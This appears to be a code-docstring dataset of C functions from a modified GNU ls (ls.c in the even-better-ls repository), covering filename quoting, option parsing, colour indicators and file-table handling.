{"docstring": "/* Output to OUT a quoted representation of the file name NAME,\n   using OPTIONS to control quoting.  Produce no output if OUT is NULL.\n   Store the number of screen columns occupied by NAME's quoted\n   representation into WIDTH, if non-NULL.  Return the number of bytes\n   produced.  */\n", "func_signal": "static size_t\nquote_name (FILE *out, const char *name, struct quoting_options const *options,\n            size_t *width)", "code": "{\n  char smallbuf[BUFSIZ];\n  size_t len = quotearg_buffer (smallbuf, sizeof smallbuf, name, -1, options);\n  char *buf;\n  size_t displayed_width IF_LINT (= 0);\n\n  if (len < sizeof smallbuf)\n    buf = smallbuf;\n  else\n    {\n      buf = alloca (len + 1);\n      quotearg_buffer (buf, len + 1, name, -1, options);\n    }\n\n  if (qmark_funny_chars)\n    {\n      if (MB_CUR_MAX > 1)\n        {\n          char const *p = buf;\n          char const *plimit = buf + len;\n          char *q = buf;\n          displayed_width = 0;\n\n          while (p < plimit)\n            switch (*p)\n              {\n                case ' ': case '!': case '\"': case '#': case '%':\n                case '&': case '\\'': case '(': case ')': case '*':\n                case '+': case ',': case '-': case '.': case '/':\n                case '0': case '1': case '2': case '3': case '4':\n                case '5': case '6': case '7': case '8': case '9':\n                case ':': case ';': case '<': case '=': case '>':\n                case '?':\n                case 'A': case 'B': case 'C': case 'D': case 'E':\n                case 'F': case 'G': case 'H': case 'I': case 'J':\n                case 'K': case 'L': case 'M': case 'N': case 'O':\n                case 'P': case 'Q': case 'R': case 'S': case 'T':\n                case 'U': case 'V': case 'W': case 'X': case 'Y':\n                case 'Z':\n                case '[': case '\\\\': case ']': case '^': case '_':\n                case 'a': case 'b': case 'c': case 'd': case 'e':\n                case 'f': case 'g': case 'h': case 'i': case 'j':\n                case 'k': case 'l': case 'm': case 'n': case 'o':\n                case 'p': case 'q': case 'r': case 's': case 't':\n                case 'u': case 'v': case 'w': case 'x': case 'y':\n                case 'z': case '{': case '|': case '}': case '~':\n                  /* These characters are printable ASCII characters.  */\n                  *q++ = *p++;\n                  displayed_width += 1;\n                  break;\n                default:\n                  /* If we have a multibyte sequence, copy it until we\n                     reach its end, replacing each non-printable multibyte\n                     character with a single question mark.  */\n                  {\n                    DECLARE_ZEROED_AGGREGATE (mbstate_t, mbstate);\n                    do\n                      {\n                        wchar_t wc;\n                        size_t bytes;\n                        int w;\n\n                        bytes = mbrtowc (&wc, p, plimit - p, &mbstate);\n\n                        if (bytes == (size_t) -1)\n                          {\n                            /* An invalid multibyte sequence was\n                               encountered.  Skip one input byte, and\n                               put a question mark.  */\n                            p++;\n                            *q++ = '?';\n                            displayed_width += 1;\n                            break;\n                          }\n\n                        if (bytes == (size_t) -2)\n                          {\n                            /* An incomplete multibyte character\n                               at the end.  Replace it entirely with\n                               a question mark.  */\n                            p = plimit;\n                            *q++ = '?';\n                            displayed_width += 1;\n                            break;\n                          }\n\n                        if (bytes == 0)\n                          /* A null wide character was encountered.  */\n                          bytes = 1;\n\n                        w = wcwidth (wc);\n                        if (w >= 0)\n                          {\n                            /* A printable multibyte character.\n                               Keep it.  */\n                            for (; bytes > 0; --bytes)\n                              *q++ = *p++;\n                            displayed_width += w;\n                          }\n                        else\n                          {\n                            /* An unprintable multibyte character.\n                               Replace it entirely with a question\n                               mark.  */\n                            p += bytes;\n                            *q++ = '?';\n                            displayed_width += 1;\n                          }\n                      }\n                    while (! mbsinit (&mbstate));\n                  }\n                  break;\n              }\n\n          /* The buffer may have shrunk.  */\n          len = q - buf;\n        }\n      else\n        {\n          char *p = buf;\n          char const *plimit = buf + len;\n\n          while (p < plimit)\n            {\n              if (! isprint (to_uchar (*p)))\n                *p = '?';\n              p++;\n            }\n          displayed_width = len;\n        }\n    }\n  else if (width != NULL)\n    {\n      if (MB_CUR_MAX > 1)\n        displayed_width = mbsnwidth (buf, len, 0);\n      else\n        {\n          char const *p = buf;\n          char const *plimit = buf + len;\n\n          displayed_width = 0;\n          while (p < plimit)\n            {\n              if (isprint (to_uchar (*p)))\n                displayed_width++;\n              p++;\n            }\n        }\n    }\n\n  if (out != NULL)\n    fwrite (buf, 1, len, out);\n  if (width != NULL)\n    *width = displayed_width;\n  return len;\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Set the exit status to report a failure.  If SERIOUS, it is a\n   serious failure; otherwise, it is merely a minor problem.  */\n", "func_signal": "static void\nset_exit_status (bool serious)", "code": "{\n  if (serious)\n    exit_status = LS_FAILURE;\n  else if (exit_status == EXIT_SUCCESS)\n    exit_status = LS_MINOR_PROBLEM;\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* If `linkname' is a relative name and `name' contains one or more\n   leading directories, return `linkname' with those directories\n   prepended; otherwise, return a copy of `linkname'.\n   If `linkname' is zero, return zero.  */\n", "func_signal": "static char *\nmake_link_name (char const *name, char const *linkname)", "code": "{\n  char *linkbuf;\n  size_t bufsiz;\n\n  if (!linkname)\n    return NULL;\n\n  if (*linkname == '/')\n    return xstrdup (linkname);\n\n  /* The link is to a relative name.  Prepend any leading directory\n     in `name' to the link name.  */\n  linkbuf = strrchr (name, '/');\n  if (linkbuf == 0)\n    return xstrdup (linkname);\n\n  bufsiz = linkbuf - name + 1;\n  linkbuf = xmalloc (bufsiz + strlen (linkname) + 1);\n  strncpy (linkbuf, name, bufsiz);\n  strcpy (linkbuf + bufsiz, linkname);\n  return linkbuf;\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Given these arguments describing a file, return the single-byte\n   type indicator, or 0.  */\n", "func_signal": "static char\nget_type_indicator (bool stat_ok, mode_t mode, enum filetype type)", "code": "{\n  char c;\n\n  if (stat_ok ? S_ISREG (mode) : type == normal)\n    {\n      if (stat_ok && indicator_style == classify && (mode & S_IXUGO))\n        c = '*';\n      else\n        c = 0;\n    }\n  else\n    {\n      if (stat_ok ? S_ISDIR (mode) : type == directory || type == arg_directory)\n        c = '/';\n      else if (indicator_style == slash)\n        c = 0;\n      else if (stat_ok ? S_ISLNK (mode) : type == symbolic_link)\n        c = '@';\n      else if (stat_ok ? S_ISFIFO (mode) : type == fifo)\n        c = '|';\n      else if (stat_ok ? S_ISSOCK (mode) : type == sock)\n        c = '=';\n      else if (stat_ok && S_ISDOOR (mode))\n        c = '>';\n      else\n        c = 0;\n    }\n  return c;\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Replace the first %b with precomputed aligned month names.\n   Note on glibc-2.7 at least, this speeds up the whole `ls -lU`\n   process by around 17%, compared to letting strftime() handle the %b.  */\n", "func_signal": "static size_t\nalign_nstrftime (char *buf, size_t size, char const *fmt, struct tm const *tm,\n                 int __utc, int __ns)", "code": "{\n  const char *nfmt = fmt;\n  /* In the unlikely event that rpl_fmt below is not large enough,\n     the replacement is not done.  A malloc here slows ls down by 2%  */\n  char rpl_fmt[sizeof (abmon[0]) + 100];\n  const char *pb;\n  if (required_mon_width && (pb = strstr (fmt, \"%b\")))\n    {\n      if (strlen (fmt) < (sizeof (rpl_fmt) - sizeof (abmon[0]) + 2))\n        {\n          char *pfmt = rpl_fmt;\n          nfmt = rpl_fmt;\n\n          pfmt = mempcpy (pfmt, fmt, pb - fmt);\n          pfmt = stpcpy (pfmt, abmon[tm->tm_mon]);\n          strcpy (pfmt, pb + 2);\n        }\n    }\n  size_t ret = nstrftime (buf, size, nfmt, tm, __utc, __ns);\n  return ret;\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Request that the directory named NAME have its contents listed later.\n   If REALNAME is nonzero, it will be used instead of NAME when the\n   directory name is printed.  This allows symbolic links to directories\n   to be treated as regular directories but still be listed under their\n   real names.  NAME == NULL is used to insert a marker entry for the\n   directory named in REALNAME.\n   If NAME is non-NULL, we use its dev/ino information to save\n   a call to stat -- when doing a recursive (-R) traversal.\n   COMMAND_LINE_ARG means this directory was mentioned on the command line.  */\n", "func_signal": "static void\nqueue_directory (char const *name, char const *realname, bool command_line_arg)", "code": "{\n  struct pending *new = xmalloc (sizeof *new);\n  new->realname = realname ? xstrdup (realname) : NULL;\n  new->name = name ? xstrdup (name) : NULL;\n  new->command_line_arg = command_line_arg;\n  new->next = pending_dirs;\n  pending_dirs = new;\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Return a pointer to a formatted version of F->stat.st_ino,\n   possibly using buffer, BUF, of length BUFLEN, which must be at least\n   INT_BUFSIZE_BOUND (uintmax_t) bytes.  */\n", "func_signal": "static char *\nformat_inode (char *buf, size_t buflen, const struct fileinfo *f)", "code": "{\n  assert (INT_BUFSIZE_BOUND (uintmax_t) <= buflen);\n  return (f->stat_ok && f->stat.st_ino != NOT_AN_INODE_NUMBER\n          ? umaxtostr (f->stat.st_ino, buf)\n          : (char *) \"?\");\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* List all the files now in the table.  */\n", "func_signal": "static void\nprint_current_files (void)", "code": "{\n  size_t i;\n\n  switch (format)\n    {\n    case one_per_line:\n      for (i = 0; i < cwd_n_used; i++)\n        {\n          print_file_name_and_frills (sorted_file[i], 0);\n          putchar ('\\n');\n        }\n      break;\n\n    case many_per_line:\n      print_many_per_line ();\n      break;\n\n    case horizontal:\n      print_horizontal ();\n      break;\n\n    case with_commas:\n      print_with_commas ();\n      break;\n\n    case long_format:\n      for (i = 0; i < cwd_n_used; i++)\n        {\n          print_long_format (sorted_file[i]);\n          DIRED_PUTCHAR ('\\n');\n        }\n      break;\n    }\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Assuming a failure is serious if SERIOUS, use the printf-style\n   MESSAGE to report the failure to access a file named FILE.  Assume\n   errno is set appropriately for the failure.  */\n", "func_signal": "static void\nfile_failure (bool serious, char const *message, char const *file)", "code": "{\n  error (0, errno, message, quotearg_colon (file));\n  set_exit_status (serious);\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Put the name of the file that FILENAME is a symbolic link to\n   into the LINKNAME field of `f'.  COMMAND_LINE_ARG indicates whether\n   FILENAME is a command-line argument.  */\n", "func_signal": "static void\nget_link_name (char const *filename, struct fileinfo *f, bool command_line_arg)", "code": "{\n  f->linkname = areadlink_with_size (filename, f->stat.st_size);\n  if (f->linkname == NULL)\n    file_failure (command_line_arg, _(\"cannot read symbolic link %s\"),\n                  filename);\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Set all the option flags according to the switches specified.\n   Return the index of the first non-option argument.  */\n", "func_signal": "static int\ndecode_switches (int argc, char **argv)", "code": "{\n  char *time_style_option = NULL;\n\n  /* Record whether there is an option specifying sort type.  */\n  bool sort_type_specified = false;\n\n  qmark_funny_chars = false;\n\n  /* initialize all switches to default settings */\n\n  switch (ls_mode)\n    {\n    case LS_MULTI_COL:\n      /* This is for the `dir' program.  */\n      format = many_per_line;\n      set_quoting_style (NULL, escape_quoting_style);\n      break;\n\n    case LS_LONG_FORMAT:\n      /* This is for the `vdir' program.  */\n      format = long_format;\n      set_quoting_style (NULL, escape_quoting_style);\n      break;\n\n    case LS_LS:\n      /* This is for the `ls' program.  */\n      if (isatty (STDOUT_FILENO))\n        {\n          format = many_per_line;\n          /* See description of qmark_funny_chars, above.  */\n          qmark_funny_chars = true;\n        }\n      else\n        {\n          format = one_per_line;\n          qmark_funny_chars = false;\n        }\n      break;\n\n    default:\n      abort ();\n    }\n\n  time_type = time_mtime;\n  sort_type = sort_name;\n  sort_reverse = false;\n  numeric_ids = false;\n  print_block_size = false;\n  indicator_style = none;\n  print_inode = false;\n  dereference = DEREF_UNDEFINED;\n  recursive = false;\n  immediate_dirs = false;\n  ignore_mode = IGNORE_DEFAULT;\n  ignore_patterns = NULL;\n  hide_patterns = NULL;\n  print_scontext = false;\n\n  /* FIXME: put this in a function.  */\n  {\n    char const *q_style = getenv (\"QUOTING_STYLE\");\n    if (q_style)\n      {\n        int i = ARGMATCH (q_style, quoting_style_args, quoting_style_vals);\n        if (0 <= i)\n          set_quoting_style (NULL, quoting_style_vals[i]);\n        else\n          error (0, 0,\n         _(\"ignoring invalid value of environment variable QUOTING_STYLE: %s\"),\n                 quotearg (q_style));\n      }\n  }\n\n  {\n    char const *ls_block_size = getenv (\"LS_BLOCK_SIZE\");\n    human_options (ls_block_size,\n                   &human_output_opts, &output_block_size);\n    if (ls_block_size || getenv (\"BLOCK_SIZE\"))\n      file_output_block_size = output_block_size;\n  }\n\n  line_length = 80;\n  {\n    char const *p = getenv (\"COLUMNS\");\n    if (p && *p)\n      {\n        unsigned long int tmp_ulong;\n        if (xstrtoul (p, NULL, 0, &tmp_ulong, NULL) == LONGINT_OK\n            && 0 < tmp_ulong && tmp_ulong <= SIZE_MAX)\n          {\n            line_length = tmp_ulong;\n          }\n        else\n          {\n            error (0, 0,\n               _(\"ignoring invalid width in environment variable COLUMNS: %s\"),\n                   quotearg (p));\n          }\n      }\n  }\n\n#ifdef TIOCGWINSZ\n  {\n    struct winsize ws;\n\n    if (ioctl (STDOUT_FILENO, TIOCGWINSZ, &ws) != -1\n        && 0 < ws.ws_col && ws.ws_col == (size_t) ws.ws_col)\n      line_length = ws.ws_col;\n  }\n#endif\n\n  {\n    char const *p = getenv (\"TABSIZE\");\n    tabsize = 8;\n    if (p)\n      {\n        unsigned long int tmp_ulong;\n        if (xstrtoul (p, NULL, 0, &tmp_ulong, NULL) == LONGINT_OK\n            && tmp_ulong <= SIZE_MAX)\n          {\n            tabsize = tmp_ulong;\n          }\n        else\n          {\n            error (0, 0,\n             _(\"ignoring invalid tab size in environment variable TABSIZE: %s\"),\n                   quotearg (p));\n          }\n      }\n  }\n\n  for (;;)\n    {\n      int oi = -1;\n      int c = getopt_long (argc, argv,\n                           \"abcdfghiklmnopqrstuvw:xABCDFGHI:LNQRST:UXZ1\",\n                           long_options, &oi);\n      if (c == -1)\n        break;\n\n      switch (c)\n        {\n        case 'a':\n          ignore_mode = IGNORE_MINIMAL;\n          break;\n\n        case 'b':\n          set_quoting_style (NULL, escape_quoting_style);\n          break;\n\n        case 'c':\n          time_type = time_ctime;\n          break;\n\n        case 'd':\n          immediate_dirs = true;\n          break;\n\n        case 'f':\n          /* Same as enabling -a -U and disabling -l -s.  */\n          ignore_mode = IGNORE_MINIMAL;\n          sort_type = sort_none;\n          sort_type_specified = true;\n          /* disable -l */\n          if (format == long_format)\n            format = (isatty (STDOUT_FILENO) ? many_per_line : one_per_line);\n          print_block_size = false;\t/* disable -s */\n          print_with_color = false;\t/* disable --color */\n          break;\n\n        case FILE_TYPE_INDICATOR_OPTION: /* --file-type */\n          indicator_style = file_type;\n          break;\n\n        case 'g':\n          format = long_format;\n          print_owner = false;\n          break;\n\n        case 'h':\n          human_output_opts = human_autoscale | human_SI | human_base_1024;\n          file_output_block_size = output_block_size = 1;\n          break;\n\n        case 'i':\n          print_inode = true;\n          break;\n\n        case 'k':\n          human_output_opts = 0;\n          file_output_block_size = output_block_size = 1024;\n          break;\n\n        case 'l':\n          format = long_format;\n          break;\n\n        case 'm':\n          format = with_commas;\n          break;\n\n        case 'n':\n          numeric_ids = true;\n          format = long_format;\n          break;\n\n        case 'o':  /* Just like -l, but don't display group info.  */\n          format = long_format;\n          print_group = false;\n          break;\n\n        case 'p':\n          indicator_style = slash;\n          break;\n\n        case 'q':\n          qmark_funny_chars = true;\n          break;\n\n        case 'r':\n          sort_reverse = true;\n          break;\n\n        case 's':\n          print_block_size = true;\n          break;\n\n        case 't':\n          sort_type = sort_time;\n          sort_type_specified = true;\n          break;\n\n        case 'u':\n          time_type = time_atime;\n          break;\n\n        case 'v':\n          sort_type = sort_version;\n          sort_type_specified = true;\n          break;\n\n        case 'w':\n          {\n            unsigned long int tmp_ulong;\n            if (xstrtoul (optarg, NULL, 0, &tmp_ulong, NULL) != LONGINT_OK\n                || ! (0 < tmp_ulong && tmp_ulong <= SIZE_MAX))\n              error (LS_FAILURE, 0, _(\"invalid line width: %s\"),\n                     quotearg (optarg));\n            line_length = tmp_ulong;\n            break;\n          }\n\n        case 'x':\n          format = horizontal;\n          break;\n\n        case 'A':\n          if (ignore_mode == IGNORE_DEFAULT)\n            ignore_mode = IGNORE_DOT_AND_DOTDOT;\n          break;\n\n        case 'B':\n          add_ignore_pattern (\"*~\");\n          add_ignore_pattern (\".*~\");\n          break;\n\n        case 'C':\n          format = many_per_line;\n          break;\n\n        case 'D':\n          dired = true;\n          break;\n\n        case 'F':\n          indicator_style = classify;\n          break;\n\n        case 'G':\t\t/* inhibit display of group info */\n          print_group = false;\n          break;\n\n        case 'H':\n          dereference = DEREF_COMMAND_LINE_ARGUMENTS;\n          break;\n\n        case DEREFERENCE_COMMAND_LINE_SYMLINK_TO_DIR_OPTION:\n          dereference = DEREF_COMMAND_LINE_SYMLINK_TO_DIR;\n          break;\n\n        case 'I':\n          add_ignore_pattern (optarg);\n          break;\n\n        case 'L':\n          dereference = DEREF_ALWAYS;\n          break;\n\n        case 'N':\n          set_quoting_style (NULL, literal_quoting_style);\n          break;\n\n        case 'Q':\n          set_quoting_style (NULL, c_quoting_style);\n          break;\n\n        case 'R':\n          recursive = true;\n          break;\n\n        case 'S':\n          sort_type = sort_size;\n          sort_type_specified = true;\n          break;\n\n        case 'T':\n          {\n            unsigned long int tmp_ulong;\n            if (xstrtoul (optarg, NULL, 0, &tmp_ulong, NULL) != LONGINT_OK\n                || SIZE_MAX < tmp_ulong)\n              error (LS_FAILURE, 0, _(\"invalid tab size: %s\"),\n                     quotearg (optarg));\n            tabsize = tmp_ulong;\n            break;\n          }\n\n        case 'U':\n          sort_type = sort_none;\n          sort_type_specified = true;\n          break;\n\n        case 'X':\n          sort_type = sort_extension;\n          sort_type_specified = true;\n          break;\n\n        case '1':\n          /* -1 has no effect after -l.  */\n          if (format != long_format)\n            format = one_per_line;\n          break;\n\n        case AUTHOR_OPTION:\n          print_author = true;\n          break;\n\n        case HIDE_OPTION:\n          {\n            struct ignore_pattern *hide = xmalloc (sizeof *hide);\n            hide->pattern = optarg;\n            hide->next = hide_patterns;\n            hide_patterns = hide;\n          }\n          break;\n\n        case SORT_OPTION:\n          sort_type = XARGMATCH (\"--sort\", optarg, sort_args, sort_types);\n          sort_type_specified = true;\n          break;\n\n        case GROUP_DIRECTORIES_FIRST_OPTION:\n          directories_first = true;\n          break;\n\n        case TIME_OPTION:\n          time_type = XARGMATCH (\"--time\", optarg, time_args, time_types);\n          break;\n\n        case FORMAT_OPTION:\n          format = XARGMATCH (\"--format\", optarg, format_args, format_types);\n          break;\n\n        case FULL_TIME_OPTION:\n          format = long_format;\n          time_style_option = bad_cast (\"full-iso\");\n          break;\n\n        case COLOR_OPTION:\n          {\n            int i;\n            if (optarg)\n              i = XARGMATCH (\"--color\", optarg, color_args, color_types);\n            else\n              /* Using --color with no argument is equivalent to using\n                 --color=always.  */\n              i = color_always;\n\n            print_with_color = (i == color_always\n                                || (i == color_if_tty\n                                    && isatty (STDOUT_FILENO)));\n\n            if (print_with_color)\n              {\n                /* Don't use TAB characters in output.  Some terminal\n                   emulators can't handle the combination of tabs and\n                   color codes on the same line.  */\n                tabsize = 0;\n              }\n            break;\n          }\n\n        case INDICATOR_STYLE_OPTION:\n          indicator_style = XARGMATCH (\"--indicator-style\", optarg,\n                                       indicator_style_args,\n                                       indicator_style_types);\n          break;\n\n        case QUOTING_STYLE_OPTION:\n          set_quoting_style (NULL,\n                             XARGMATCH (\"--quoting-style\", optarg,\n                                        quoting_style_args,\n                                        quoting_style_vals));\n          break;\n\n        case TIME_STYLE_OPTION:\n          time_style_option = optarg;\n          break;\n\n        case SHOW_CONTROL_CHARS_OPTION:\n          qmark_funny_chars = false;\n          break;\n\n        case BLOCK_SIZE_OPTION:\n          {\n            enum strtol_error e = human_options (optarg, &human_output_opts,\n                                                 &output_block_size);\n            if (e != LONGINT_OK)\n              xstrtol_fatal (e, oi, 0, long_options, optarg);\n            file_output_block_size = output_block_size;\n          }\n          break;\n\n        case SI_OPTION:\n          human_output_opts = human_autoscale | human_SI;\n          file_output_block_size = output_block_size = 1;\n          break;\n\n        case 'Z':\n          print_scontext = true;\n          break;\n\n        case_GETOPT_HELP_CHAR;\n\n        case_GETOPT_VERSION_CHAR (PROGRAM_NAME, AUTHORS);\n\n        default:\n          usage (LS_FAILURE);\n        }\n    }\n\n  max_idx = MAX (1, line_length / MIN_COLUMN_WIDTH);\n\n  filename_quoting_options = clone_quoting_options (NULL);\n  if (get_quoting_style (filename_quoting_options) == escape_quoting_style)\n    set_char_quoting (filename_quoting_options, ' ', 1);\n  if (file_type <= indicator_style)\n    {\n      char const *p;\n      for (p = \"*=>@|\" + indicator_style - file_type; *p; p++)\n        set_char_quoting (filename_quoting_options, *p, 1);\n    }\n\n  dirname_quoting_options = clone_quoting_options (NULL);\n  set_char_quoting (dirname_quoting_options, ':', 1);\n\n  /* --dired is meaningful only with --format=long (-l).\n     Otherwise, ignore it.  FIXME: warn about this?\n     Alternatively, make --dired imply --format=long?  */\n  if (dired && format != long_format)\n    dired = false;\n\n  /* If -c or -u is specified and not -l (or any other option that implies -l),\n     and no sort-type was specified, then sort by the ctime (-c) or atime (-u).\n     The behavior of ls when using either -c or -u but with neither -l nor -t\n     appears to be unspecified by POSIX.  So, with GNU ls, `-u' alone means\n     sort by atime (this is the one that's not specified by the POSIX spec),\n     -lu means show atime and sort by name, -lut means show atime and sort\n     by atime.  */\n\n  if ((time_type == time_ctime || time_type == time_atime)\n      && !sort_type_specified && format != long_format)\n    {\n      sort_type = sort_time;\n    }\n\n  if (format == long_format)\n    {\n      char *style = time_style_option;\n      static char const posix_prefix[] = \"posix-\";\n\n      if (! style)\n        if (! (style = getenv (\"TIME_STYLE\")))\n          style = bad_cast (\"locale\");\n\n      while (strncmp (style, posix_prefix, sizeof posix_prefix - 1) == 0)\n        {\n          if (! hard_locale (LC_TIME))\n            return optind;\n          style += sizeof posix_prefix - 1;\n        }\n\n      if (*style == '+')\n        {\n          char *p0 = style + 1;\n          char *p1 = strchr (p0, '\\n');\n          if (! p1)\n            p1 = p0;\n          else\n            {\n              if (strchr (p1 + 1, '\\n'))\n                error (LS_FAILURE, 0, _(\"invalid time style format %s\"),\n                       quote (p0));\n              *p1++ = '\\0';\n            }\n          long_time_format[0] = p0;\n          long_time_format[1] = p1;\n        }\n      else\n        switch (XARGMATCH (\"time style\", style,\n                           time_style_args,\n                           time_style_types))\n          {\n          case full_iso_time_style:\n            long_time_format[0] = long_time_format[1] =\n              \"%Y-%m-%d %H:%M:%S.%N %z\";\n            break;\n\n          case long_iso_time_style:\n          case_long_iso_time_style:\n            long_time_format[0] = long_time_format[1] = \"%Y-%m-%d %H:%M\";\n            break;\n\n          case iso_time_style:\n            long_time_format[0] = \"%Y-%m-%d \";\n            long_time_format[1] = \"%m-%d %H:%M\";\n            break;\n\n          case locale_time_style:\n            if (hard_locale (LC_TIME))\n              {\n                /* Ensure that the locale has translations for both\n                   formats.  If not, fall back on long-iso format.  */\n                int i;\n                for (i = 0; i < 2; i++)\n                  {\n                    char const *locale_format =\n                      dcgettext (NULL, long_time_format[i], LC_TIME);\n                    if (locale_format == long_time_format[i])\n                      goto case_long_iso_time_style;\n                    long_time_format[i] = locale_format;\n                  }\n              }\n          }\n      /* Note we leave %5b etc. alone so user widths/flags are honored.  */\n      if (strstr (long_time_format[0],\"%b\") || strstr (long_time_format[1],\"%b\"))\n        if (!abmon_init ())\n          error (0, 0, _(\"error initializing month strings\"));\n    }\n\n  return optind;\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* A SIGTSTP was received; arrange for the program to suspend itself.  */\n", "func_signal": "static void\nstophandler (int sig)", "code": "{\n  if (! SA_NOCLDSTOP)\n    signal (sig, stophandler);\n  if (! interrupt_signal)\n    stop_signal_count++;\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Return true if one of the PATTERNS matches FILE.  */\n", "func_signal": "static bool\npatterns_match (struct ignore_pattern const *patterns, char const *file)", "code": "{\n  struct ignore_pattern const *p;\n  for (p = patterns; p; p = p->next)\n    if (fnmatch (p->pattern, file, FNM_PERIOD) == 0)\n      return true;\n  return false;\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Returns whether any color sequence was printed. */\n", "func_signal": "static bool\nprint_color_indicator (const struct fileinfo *f, bool symlink_target)", "code": "{\n  enum indicator_no type;\n  struct color_ext_type *ext;\t/* Color extension */\n  size_t len;\t\t\t/* Length of name */\n\n  const char* name;\n  mode_t mode;\n  int linkok;\n  if (symlink_target)\n    {\n      name = f->linkname;\n      mode = f->linkmode;\n      linkok = f->linkok - 1;\n    }\n  else\n    {\n      name = f->name;\n      mode = FILE_OR_LINK_MODE (f);\n      linkok = f->linkok;\n    }\n\n  /* Is this a nonexistent file?  If so, linkok == -1.  */\n\n  if (linkok == -1 && color_indicator[C_MISSING].string != NULL)\n    type = C_MISSING;\n  else if (!f->stat_ok)\n    {\n      static enum indicator_no filetype_indicator[] = FILETYPE_INDICATORS;\n      type = filetype_indicator[f->filetype];\n    }\n  else\n    {\n      if (S_ISREG (mode))\n        {\n          type = C_FILE;\n\n          if ((mode & S_ISUID) != 0 && is_colored (C_SETUID))\n            type = C_SETUID;\n          else if ((mode & S_ISGID) != 0 && is_colored (C_SETGID))\n            type = C_SETGID;\n          else if (is_colored (C_CAP) && f->has_capability)\n            type = C_CAP;\n          else if ((mode & S_IXUGO) != 0 && is_colored (C_EXEC))\n            type = C_EXEC;\n          else if ((1 < f->stat.st_nlink) && is_colored (C_MULTIHARDLINK))\n            type = C_MULTIHARDLINK;\n        }\n      else if (S_ISDIR (mode))\n        {\n          type = C_DIR;\n\n          if ((mode & S_ISVTX) && (mode & S_IWOTH)\n              && is_colored (C_STICKY_OTHER_WRITABLE))\n            type = C_STICKY_OTHER_WRITABLE;\n          else if ((mode & S_IWOTH) != 0 && is_colored (C_OTHER_WRITABLE))\n            type = C_OTHER_WRITABLE;\n          else if ((mode & S_ISVTX) != 0 && is_colored (C_STICKY))\n            type = C_STICKY;\n        }\n      else if (S_ISLNK (mode))\n        type = ((!linkok && color_indicator[C_ORPHAN].string)\n                ? C_ORPHAN : C_LINK);\n      else if (S_ISFIFO (mode))\n        type = C_FIFO;\n      else if (S_ISSOCK (mode))\n        type = C_SOCK;\n      else if (S_ISBLK (mode))\n        type = C_BLK;\n      else if (S_ISCHR (mode))\n        type = C_CHR;\n      else if (S_ISDOOR (mode))\n        type = C_DOOR;\n      else\n        {\n          /* Classify a file of some other type as C_ORPHAN.  */\n          type = C_ORPHAN;\n        }\n    }\n\n  /* Check the file's suffix only if still classified as C_FILE.  */\n  ext = NULL;\n      /* Test if NAME has a recognized suffix.  */\n\n      len = strlen (name);\n      name += len;\t\t/* Pointer to final \\0.  */\n      for (ext = color_ext_list; ext != NULL; ext = ext->next)\n        {\n          if (ext->ext.len <= len\n              && strncmp (name - ext->ext.len, ext->ext.string,\n                          ext->ext.len) == 0)\n            break;\n        }\n\n  {\n    const struct bin_str *const s\n      = ext ? &(ext->seq) : &color_indicator[type];\n    if (s->string != NULL)\n      {\n        put_indicator (&color_indicator[C_LEFT]);\n        put_indicator (s);\n        put_indicator (&color_indicator[C_RIGHT]);\n        return true;\n      }\n    else\n      return false;\n  }\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Empty the table of files.  */\n", "func_signal": "static void\nclear_files (void)", "code": "{\n  size_t i;\n\n  for (i = 0; i < cwd_n_used; i++)\n    {\n      struct fileinfo *f = sorted_file[i];\n      free (f->name);\n      free (f->linkname);\n      if (f->scontext != UNKNOWN_SECURITY_CONTEXT)\n        freecon (f->scontext);\n    }\n\n  cwd_n_used = 0;\n  any_has_acl = false;\n  inode_number_width = 0;\n  block_size_width = 0;\n  nlink_width = 0;\n  owner_width = 0;\n  group_width = 0;\n  author_width = 0;\n  scontext_width = 0;\n  major_device_number_width = 0;\n  minor_device_number_width = 0;\n  file_size_width = 0;\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
